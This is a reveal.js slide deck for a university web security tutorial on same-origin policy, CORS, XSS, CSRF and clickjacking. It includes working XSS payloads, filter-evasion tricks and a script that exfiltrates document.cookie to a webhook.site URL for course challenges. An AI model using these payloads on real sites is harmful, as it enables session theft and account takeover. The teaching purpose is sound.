<!doctype html><html lang=en><head><meta charset=utf-8><title>07: xss</title>
<meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><link rel=stylesheet href=../reveal-js/dist/reset.css><link rel=stylesheet href=../reveal-js/dist/reveal.css><link rel=stylesheet href=../reveal-js/dist/theme/black.css id=theme><link rel=stylesheet href=../highlight-js/default.min.css></head><body><div class=reveal><div class=slides><section><h2 id=well-get-started-at-5-past>We&rsquo;ll get started at 5 past</h2></section><section data-noprocess data-shortcode-slide class=center><h1 id=week07>Week07</h1><h3 id=comp6443-h18a>COMP6443 H18A</h3><p>Cross Site Scripting (XSS)</p></section><section><h1 id=house-cleaning>House cleaning</h1><section data-shortcode-section><h2 id=due-dates>Due Dates</h2><ul><li>Some of the XSS related challenges are out now. Some are broken&mldr;. thanks @melon</li><li>These are due Week08 Sunday @ 11:59pm</li></ul></section><section><h2 id=report-groups>Report groups</h2><ul><li>The second report is coming soon (I think)</li><li>Same groups! But with feedback ;)</li><li>Marks/feedback will be out at some point</li></ul><blockquote><p>(But I marked your reports if you want some feedback today shh&mldr;)</p></blockquote></section></section><section><h2 id=origin-vs-site>Origin vs Site</h2><h3 id=origin>Origin</h3><blockquote><p><span style=color:#021691>https://</span><span style=color:#fffacd>www.example.com</span><span style=color:#7fffd4>:80</span></p></blockquote><span class=fragment><p>origin = <span style=color:#021691>scheme</span> + <span style=color:#fffacd>host</span> + <span style=color:#7fffd4>port</span></p></span><ul><li>This is where some request came from! (Or did it)</li></ul></section><section><h2 id=origin-vs-site-1>Origin vs Site</h2><h3 id=site>Site</h3><blockquote><p><span style=color:#021691>http://</span><span style=color:brown>www.</span><u><span style=color:#fffacd>example</span><span style=color:#d2691e>.com</span></u><span style=color:#7fffd4>:80</span>
<span style=color:#021691>https://</span><span style=color:brown>api.</span><u><span style=color:#fffacd>example</span><span style=color:#d2691e>.com</span></u><span style=color:#7fffd4>:443</span></p></blockquote><span class=fragment><p>site = <span style=color:#fffacd>private_domain</span> + <span style=color:#d2691e>public_suffix</span></p><ul><li><s><span style=color:#021691>scheme</span>, <span style=color:brown>subdomain</span> and <span style=color:#7fffd4>port</span></s></li></ul></span><ul><li>COMPLETELY DIFFERENT WEBSITE!</li></ul></section><section><p>So what are some restrictions on these Sites and Origins?</p></section><section><section data-shortcode-section><h2 id=sop-same-origin-policy>SOP (Same Origin Policy)</h2><ul><li><p>Browser feature! (1995)</p></li><li><p>Restricts getting resources to/from an <em>external</em> site</p></li></ul><blockquote><p>If you request something from another website, Same Origin Policy says that you cant access any of the resources because its only accessible on the same origin!</p></blockquote><ul><li>&ldquo;<em>External</em>&rdquo; is based on <em>SOP</em>: only requests from the same <code>origin</code> are allowed to use the resources</li></ul><blockquote><p>read more <a href=https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>here</a></p></blockquote></section><section><h2 id=why-is-this-good>Why is this good?</h2><ul><li>Basically you used to be able to just send a request to a website and randomly access everything about that website.</li></ul><ul><li>Javascript running</li><li>Sending requests</li><li>Setting cookies</li></ul><blockquote><p>Old days of the interwebs.</p></blockquote></section><section><p>But Jesse if we block all these requests to resources how do we get our <a href=https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIzLTA5L3Jhd3BpeGVsX29mZmljZV8zNF9mbHVmZnlfY2h1YmJ5X3Bhc3RlbF9jYXRzX2thd2FpaV9hZXN0aGV0aWNfM182YTJkZjRmNS03NTZiLTQyODgtOWQ4Mi1lZmRlMmE1MTA2OWRfMS5qcGc.jpg>cute cat photos</a>?</p><blockquote><p>CORS</p></blockquote><p>Who has heard of this?</p></section><section><h3 id=cross-origin-resource-sharing>Cross-Origin Resource Sharing</h3><ul><li><p>Obviously sometimes you need to access resources from another origin (e.g. using images, videos)</p></li><li><p>This can be achieved if the resource owner sets certain headers on the resource (<a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers>more here</a>)</p></li></ul><p>For example:</p><p>This lets any origin load the resource</p><pre tabindex=0><code>Access-Control-Allow-Origin: *
</code></pre></section><section><h3 id=can-it-be-bypassed>Can it be bypassed</h3><ul><li>It&rsquo;s just a browser protection</li><li>Doesn&rsquo;t prevent the request (it&rsquo;ll still succeed), it prevents you from accessing the response.</li><li>Would it block you if accessed it through a script?</li></ul></section><section><h3 id=this-is-confusing-i-know>This is confusing I KNOW</h3><p>So SOP prevents us from loading resources.
CORS allows specific origins to load specific resources.</p><p>For example, if I clicked someones malicious link, because of SOP, if the malicious website
sent a request to <code>Bank.com</code>, the request would be blocked!</p><blockquote><p>IM SAFE!</p></blockquote></section></section><section><h2 id=client-side-injection>Client-side injection</h2><ul><li>HTML Injection</li><li>XSS</li><li>CSRF</li></ul></section><section><section data-shortcode-section></section><section><h2 id=html>HTML?</h2><p>Html is basically just a bunch of tags that look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>&lt;<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>p</span>&gt;stuff&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>div</span>&gt;
</span></span></code></pre></div><p>We have seen this alot in our developer tools!
The <code>elements</code> part of the devtools is called the DOM!</p></section><section><h3 id=html-injection>HTML injection</h3><ul><li>Browsers just render the DOM (HTML ELEMENTS)</li><li>How would it know if tags are user-supplied or server-supplied</li><li>what if our input was just <code>&lt;s></code>?</li></ul></section><section><h2 id=demo>DEMO</h2></section><section><h3 id=know-your-tags>Know your tags</h3><ul><li>Some are paired <code>&lt;div>&lt;/div></code></li><li>Some can be unpaired <code>&lt;img src=.../></code></li><li>what goes in here? <code>&lt;script>...&lt;/script></code></li></ul></section></section><section><section data-shortcode-section><h3 id=xss-cross-site-scripting>XSS (Cross-site scripting)</h3><ul><li>Not technically &ldquo;cross-site&rdquo;</li><li>Think of it as &ldquo;Javascript Injection&rdquo;</li><li>Your browser can take in inputs and place them inside the DOM (html elements)<ul><li>If you do this insecurely you can execute arbitrary javascript</li></ul></li><li>Tricking a <strong>browser</strong> into executing your code</li></ul></section><section><h3 id=reflected-xss>Reflected XSS</h3><ul><li>Payload is part of user input<ul><li>e.g. a search query, cookie, header, etc</li><li>anything insecurely rendered on the page</li></ul></li></ul><blockquote><p><a href><code>www.example.com/database?q=&lt;script>alert(1)&lt;/script></code></a></p></blockquote></section><section><h3 id=stored-xss>Stored XSS</h3><ul><li>Payload is stored in some database<ul><li>Anybody who visits a certain page will view it</li><li>e.g. blog posts, twitter (lol)</li></ul></li><li>generally worse, but more easily detected</li></ul></section><section><h3 id=dom-based-xss>DOM-based XSS</h3><ul><li>Similar to the others, but the vulnerability comes from modifying the DOM</li><li>document is basically like a global variable that lets you modify/view all the elements in the dom</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>pos</span><span style=color:#f92672>=</span>document.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>indexOf</span>(<span style=color:#e6db74>&#34;context=&#34;</span>)<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>; 
</span></span><span style=display:flex><span>document.<span style=color:#a6e22e>write</span>(document.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>substring</span>(<span style=color:#a6e22e>pos</span>,document.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>length</span>)); 
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div></section><section><h3 id=demo>Demo!</h3></section><section><ul><li>Reflected</li><li>Stored</li><li>Dom Based</li></ul></section><section><h3 id=xss-isnt-just-script-tags>XSS isn&rsquo;t just <code>&lt;script></code> tags</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e>// event-handlers
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#a6e22e>x</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;alert(1)&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#75715e>// injecting into javascript code
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;user_input&gt;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// and much more
</span></span></span></code></pre></div><blockquote><p>it&rsquo;s any time you get user supplied input in a javascript context</p></blockquote></section><section><h3 id=some-good-resources>Some good resources</h3><ul><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection>PayloadAllTheThings</a></li><li><a href=https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html>OWASP Cheat Sheet</a></li><li><a href=https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting>HackTricks</a></li><li><a href=https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>PortSwigger</a></li></ul></section></section><section></section><section><h3 id=bonus-breaking-mitigations>Bonus: breaking mitigations</h3><ul><li>Content stripped/blocked<ul><li>different tag <code>&lt;img onerror=...></code> !!IMPORTANT!!</li><li>different event handler <code>&lt;body onload=...></code> !!IMPORTANT!!</li><li>embed dummy characters: <code>&lt;SCRscriptIPT></code></li><li>use alternating case: <code>&lt;ScRiPt></code></li></ul></li></ul><blockquote><p><a href=https://github.com/payloadbox/xss-payload-list>here&rsquo;s a couple more</a></p></blockquote></section><section><h2 id=hahahugoshortcode9s7hbhb><section data-shortcode-section><p>How do you solve these challenges?</p><blockquote><p>requestbin/webhooks</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;https://webhook.site/dba43b3c-1c05-4de5-b49f-376261fee98e?&#34;</span><span style=color:#f92672>+</span> document.<span style=color:#a6e22e>cookie</span>)<span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
</span></span></code></pre></div></section><section><blockquote><p>MY COOKIES!!!</p></blockquote><p>Oh well.</p></section><section><h3 id=cookies-samesite>Cookies (SameSite)</h3><ul><li><em>None</em>:</li></ul><p><span class=fragment>Cookies are always sent</span></p><ul><li><em>Lax</em>:</li></ul><p><span class=fragment>(default) not sent cross-site</span></p><pre><code>* images/iframes 
</code></pre><p><span class=fragment><em><code>no</code></em></span></p><pre><code>* navigation (GET)    
</code></pre><p><span class=fragment><em><code>yes</code></em></span></p><ul><li><em>Strict</em>:</li></ul><p><span class=fragment>Cookies aren’t sent</span></p><blockquote><p>read more <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite>here</a></p></blockquote></section></h2><h2 id=csrf>CSRF</h2><section data-shortcode-section><h3 id=what-is-it>What is it?</h3><ul><li>Cross-site request forgery</li><li>Trick a user into performing an unintended action<ul><li>e.g. make them authorize a bank transaction</li><li>e.g. make them change their email/password</li></ul></li><li><em>kinda similar to SSRF</em></li></ul></section><section><h3 id=heading></h3><pre tabindex=0><code>&lt;form method=&#34;POST&#34; &gt;
</code></pre></section><section><h3 id=demo>Demo!</h3></section></section><section><h2 id=click-jacking>Click-jacking</h2><section data-shortcode-section><ul><li><p>A fake form sitting under a real form</p></li><li><p>if you try to interact with the fake form, you&rsquo;ll accidentally interact with the real one.</p></li><li><p>This could be either local, or external</p><ul><li>local: same form switch confirm/cancel buttons</li><li>external: an invisible iframe with a higher z-index</li></ul></li></ul></section><section><h3 id=demo>Demo</h3></section></section><section></section></div></div><script type=text/javascript src=../reveal-hugo/object-assign.js></script><script src=../reveal-js/dist/reveal.js></script><script type=text/javascript src=../reveal-js/plugin/markdown/markdown.js></script><script type=text/javascript src=../reveal-js/plugin/highlight/highlight.js></script><script type=text/javascript src=../reveal-js/plugin/zoom/zoom.js></script><script type=text/javascript src=../reveal-js/plugin/notes/notes.js></script><script type=text/javascript>function camelize(e){return e&&Object.keys(e).forEach(function(t){newK=t.replace(/(_\w)/g,function(e){return e[1].toUpperCase()}),newK!=t&&(e[newK]=e[t],delete e[t])}),e}var revealHugoDefaults={center:!0,controls:!0,history:!0,progress:!0,transition:"slide"},revealHugoSiteParams={},revealHugoPageParams={},revealHugoPlugins={plugins:[RevealMarkdown,RevealHighlight,RevealZoom,RevealNotes]},options=Object.assign({},camelize(revealHugoDefaults),camelize(revealHugoSiteParams),camelize(revealHugoPageParams),camelize(revealHugoPlugins));Reveal.initialize(options)</script></body></html>